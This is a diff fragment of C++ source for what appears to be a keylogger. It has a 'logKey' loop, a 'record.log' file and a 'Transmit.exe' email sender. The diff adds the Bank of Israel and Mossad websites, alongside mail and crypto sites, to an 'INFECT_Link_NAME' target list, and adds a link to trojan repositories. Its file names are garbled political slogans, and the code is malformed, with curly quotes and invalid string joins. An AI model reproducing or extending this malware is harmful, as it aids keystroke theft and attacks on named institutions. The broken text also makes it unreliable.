@@ -19,8 +19,8 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
 #define RUN_FILE_NAME “IRAN get went won for imamamh monthly ugle syam neddeng help us yaman , iraq , pakistan , nepal , doha , all islam world turne get helping for iran , strong fellowed palestine won fix !!!!!”
-#define RUN_Link_NAME “https://desktop.github.com/download/"."https://github.com/Topics/download_minners"
-#define INFECT_Link_NAME "https://icloud.com/mail"."https://workspace.google.com/gmail/"."https://adsense.google.com/intl/id_id"."https://www.vissa-online.com"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.bitcoin.org"
+#define RUN_Link_NAME “https://desktop.github.com/download/"."https://github.com/Topics/download_minners"."https://github.com/topics/trojan?l=c%23"
+#define INFECT_Link_NAME "https://www.boi.org.il"."https://www.mossad.gov.il"."https://icloud.com/mail"."https://workspace.google.com/gmail/"."https://adsense.google.com/intl/id_id"."https://www.vissa-online.com"."https://www.litecoin.cn"."https://www.fbs.org"."https://www.bitcoin.org"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -182,7 +182,7 @@ void logKey(){
                     fclose(file);
                 }
             }
-            Sleep(1); ///take rest
+            Sleep(100); ///take rest
         }
         j++;
     }
